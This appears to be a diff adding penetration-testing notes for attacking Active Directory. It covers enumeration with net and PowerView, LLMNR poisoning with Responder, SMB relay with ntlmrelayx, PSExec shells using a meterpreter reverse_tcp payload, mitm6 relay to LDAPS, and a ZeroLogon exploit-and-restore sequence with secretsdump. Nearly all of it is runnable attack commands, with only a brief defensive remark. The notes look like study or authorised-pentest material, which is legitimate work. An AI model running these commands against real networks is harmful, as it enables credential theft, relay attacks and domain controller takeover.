@@ -1,0 +1,114 @@
+# Enumerating AD
+
+Enumerate users
+
+net user
+net user /domain
+net user $domain_user /domain
+Enumerate groups
+
+net group /domain
+
+# Includes domain users that are part of local administrators group
+net localgroup administrators
+PowerView
+
+# Import PowerView
+PS> Import-Module .\PowerView.ps1
+
+# Get info about current domain
+PS> Get-NetDomain
+
+# List members of Domain Admins group
+PS> Get-NetGroupMember -GroupName "Domain Admins"
+
+# List all computers in domain
+PS> Get-NetComputer
+
+# Enumerate logged-on users
+# NB: only lists users logged on to target if we have local administrator privileges on target
+PS> Get-NetLoggedon -ComputerName $hostname
+
+# Enumerate active user sessions on servers e.g. file servers or domain controllers
+PS> Get-NetSession -ComputerName $hostname
+
+# Enumerate SPNs
+PS> Get-NetUser -SPN | select serviceprincipalname
+
+# Abusing LLMNR poisoning
+
+Using responder - 
+python /opt/Responder/Responder.py -I INTERFACEID -rdwv
+
+	(Defend against this by disabling LLMNR and NBT)
+
+# SMB Relay Attacks
+
+nmap --script=smb2-security-mode.nse -p445 NETWORK
+
+(If SMB signing is disabled)
+
+Send targets to a list (targets .txt)
+
+Launch Responser 
+Launch NTLMRelayx.py
+	python /opt/impacket-0.9.19/examples/ntlmrelayx.py -tf targets.txt -smb2support 
+	
+	-i Interactive 
+	-e Execute
+	-c Command
+	
+Copy SAM hashes and crack offline
+
+# Getting a Shell with PSExec
+
+Use SAM database credentials to exploit SMB
+
+MSF > exploit/windows/smb/psexec
+Set RHOST
+Set smbdomain (testlab.local)
+set smbuser (Username)
+set smbpass (crackedPass)
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST
+
+run
+
+OR
+
+psexec.py DOMAIN.LOCAL/Username:Password@IPADDRESS
+
+smbexec.py DOMAIN.LOCAL/Username:Password@IPADDRESS
+
+wmiexec.py DOMAIN.LOCAL/Username:Password@IPADDRESS
+
+# Utilizing MITM6
+
+mitm6 -d DOMAIN.local
+
+ntlmrelayx.py -6 -t ldaps://IPADDRESS -wh fakewpad.testlab.local -l lootme
+
+Utilize the new credential created to login to DC
+
+# Abusing ZeroLogon
+
+run >> python3 zerologon_tester.py MACHINE IPADDRESS
+
+if it confirms that it can be abused:
+
+run >> python3 cve-2020-1472-exploit.py MACHINE IPADDRESS
+confim using >> secretsdump.py -just-dc DOMAIN/MACHINE\$@IPADDRESS (notate admin hash)
+
+Restore by finding the plain_password_hex hash:
+secretsdump.py Administrator@IPADDRESS -hashes ADMINHASH
+
+
+python3 restorepassword.py DOMAIN/MACHINE@MACHINE -target-ip IPADDRESS -hexpass PLAINPASSHASH
+
+
+# Internal Playbook
+
+Begin by running MITM6 or Responder
+Run scans to try to generate traffic
+Look for websites in scope
+Look for default creds (printers, Jenkins, etc)
